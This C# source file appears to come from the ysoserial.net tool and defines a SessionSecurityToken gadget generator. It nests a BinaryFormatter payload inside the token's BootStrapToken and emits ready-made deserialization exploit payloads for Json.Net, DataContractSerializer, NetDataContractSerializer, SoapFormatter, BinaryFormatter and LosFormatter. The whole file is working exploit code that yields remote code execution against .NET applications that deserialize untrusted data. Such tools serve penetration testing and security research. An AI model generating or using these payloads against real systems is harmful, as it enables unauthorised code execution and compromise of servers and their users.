using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Serialization;
using System.Xml;
using ysoserial.Helpers;
using System.IdentityModel.Tokens;
using System.Text.RegularExpressions;

namespace ysoserial.Generators
{
    public class SessionSecurityTokenGenerator : GenericGenerator
    {
        // Although it looks similar to WindowsIdentityGenerator but "actor" does not work in this context 

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "Json.Net", "DataContractSerializer", "NetDataContractSerializer", "SoapFormatter", "LosFormatter" };
        }

        public override string Name()
        {
            return "SessionSecurityToken";
        }

        public override string Finders()
        {
            return "@mufinnnnnnn, Soroush Dalili";
        }

        public override string Contributors()
        {
            return "Soroush Dalili";
        }
        
        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.BridgeAndDerived };
        }

        public override string SupportedBridgedFormatter()
        {
            return Formatters.BinaryFormatter;
        }

        private string GetB64SessionToken(string b64encoded)
        {
            var obj = new SessionSecurityTokenMarshal(b64encoded);
            string ndc_serialized = SerializersHelper.NetDataContractSerializer_serialize(obj);
            Regex b64SessionTokenPattern = new Regex(@"\<SessionToken[^>]+>([^<]+)");
            Match b64SessionTokenMatch = b64SessionTokenPattern.Match(ndc_serialized);
            return b64SessionTokenMatch.Groups[1].Value;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            byte[] binaryFormatterPayload;
            if (BridgedPayload != null)
            {
                binaryFormatterPayload = (byte[])BridgedPayload;
            }
            else
            {
                IGenerator generator = new TextFormattingRunPropertiesGenerator();
                binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs);
            }

            string b64encoded = Convert.ToBase64String(binaryFormatterPayload);

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
            {
                var obj = new SessionSecurityTokenMarshal(b64encoded);
                return Serialize(obj, formatter, inputArgs);
            }
            else if (formatter.ToLower().Equals("json.net"))
            {

                string payload = "{'$type': 'System.IdentityModel.Tokens.SessionSecurityToken, System.IdentityModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089', 'SessionToken':{'$type':'System.Byte[], mscorlib','$value':'" + GetB64SessionToken(b64encoded) + "'}}";

                if (inputArgs.Minify)
                {
                    payload = JsonHelper.Minify(payload, new string[] { "System.IdentityModel" }, null);
                }


                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.JsonNet_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("datacontractserializer"))
            {

                string payload = $@"<root type=""System.IdentityModel.Tokens.SessionSecurityToken, System.IdentityModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""><SessionSecurityToken xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:x=""http://www.w3.org/2001/XMLSchema"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns=""http://schemas.datacontract.org/2004/07/System.IdentityModel.Tokens"">
  <SessionToken i:type=""x:base64Binary"" xmlns="""">{GetB64SessionToken(b64encoded)}</SessionToken>
</SessionSecurityToken></root>";

                if (inputArgs.Minify)
                {
                    payload = XmlHelper.Minify(payload, null, null);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.DataContractSerializer_deserialize(payload, null, "root", "type");
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("netdatacontractserializer"))
            {

                string payload = $@"<w xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:x=""http://www.w3.org/2001/XMLSchema"" z:Id=""1"" z:Type=""System.IdentityModel.Tokens.SessionSecurityToken"" z:Assembly=""System.IdentityModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns="""">
  <SessionToken z:Type=""System.Byte[]"" z:Assembly=""0"" xmlns="""">{GetB64SessionToken(b64encoded)}</SessionToken>
</w>";

                if (inputArgs.Minify)
                {
                    payload = XmlHelper.Minify(payload, null, null);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.NetDataContractSerializer_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("soapformatter"))
            {

                string payload = $@"<SOAP-ENV:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:SOAP-ENC=""http://schemas.xmlsoap.org/soap/encoding/"" xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:clr=""http://schemas.microsoft.com/soap/encoding/clr/1.0"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
<SOAP-ENV:Body>
<a1:SessionSecurityToken id=""ref-1"" xmlns:a1=""http://schemas.microsoft.com/clr/nsassem/System.IdentityModel.Tokens/System.IdentityModel%2C%20Version%3D4.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Db77a5c561934e089"">
<SessionToken href=""#ref-3""/>
</a1:SessionSecurityToken>
<SOAP-ENC:Array id=""ref-3"" xsi:type=""SOAP-ENC:base64"">{GetB64SessionToken(b64encoded)}</SOAP-ENC:Array>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
";

                if (inputArgs.Minify)
                {
                    payload = XmlHelper.Minify(payload, null, null, FormatterType.SoapFormatter);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.SoapFormatter_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }

    [Serializable]
    public class SessionSecurityTokenMarshal : ISerializable
    {
        public SessionSecurityTokenMarshal(string b64payload)
        {
            B64Payload = b64payload;
        }

        private string B64Payload { get; }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(SessionSecurityToken));
            MemoryStream stream = new MemoryStream();

            using (XmlDictionaryWriter xmlDictionaryWriter = XmlDictionaryWriter.CreateBinaryWriter(stream, null, null))
            {
                xmlDictionaryWriter.WriteStartElement("SecurityContextToken", "");

                xmlDictionaryWriter.WriteStartElement("Version", "");
                xmlDictionaryWriter.WriteValue("1");
                xmlDictionaryWriter.WriteEndElement();

                xmlDictionaryWriter.WriteElementString("SecureConversationVersion", "", (new Uri("http://schemas.xmlsoap.org/ws/2005/02/sc")).AbsoluteUri);

                xmlDictionaryWriter.WriteElementString("Id", "", "1");

                WriteElementStringAsUniqueId(xmlDictionaryWriter, "ContextId", "", "1");

                xmlDictionaryWriter.WriteStartElement("Key", "");
                xmlDictionaryWriter.WriteBase64(new byte[] { 0x01 }, 0, 1);
                xmlDictionaryWriter.WriteEndElement();

                WriteElementContentAsInt64(xmlDictionaryWriter, "EffectiveTime", "", 1);
                WriteElementContentAsInt64(xmlDictionaryWriter, "ExpiryTime", "", 1);
                WriteElementContentAsInt64(xmlDictionaryWriter, "KeyEffectiveTime", "", 1);
                WriteElementContentAsInt64(xmlDictionaryWriter, "KeyExpiryTime", "", 1);

                xmlDictionaryWriter.WriteStartElement("ClaimsPrincipal", "");
                xmlDictionaryWriter.WriteStartElement("Identities", "");
                xmlDictionaryWriter.WriteStartElement("Identity", "");
                xmlDictionaryWriter.WriteStartElement("BootStrapToken", "");
                xmlDictionaryWriter.WriteValue(B64Payload); // This is where the payload is
                xmlDictionaryWriter.WriteEndElement();
                xmlDictionaryWriter.WriteEndElement();
                xmlDictionaryWriter.WriteEndElement();
                xmlDictionaryWriter.WriteEndElement();

                xmlDictionaryWriter.WriteEndElement();
                xmlDictionaryWriter.Flush();

                stream.Position = 0;

                //Console.WriteLine(Encoding.ASCII.GetString(stream.ToArray()));

                info.AddValue("SessionToken", stream.ToArray());

            }
        }

        private void WriteElementContentAsInt64(XmlDictionaryWriter writer, String localName, String ns, long value)
        {
            writer.WriteStartElement(localName, ns);
            writer.WriteValue(value);
            writer.WriteEndElement();
        }

        private void WriteElementStringAsUniqueId(XmlDictionaryWriter writer, String localName, String ns, string id)
        {
            writer.WriteStartElement(localName, ns);
            writer.WriteValue(id);
            writer.WriteEndElement();
        }

    }
}
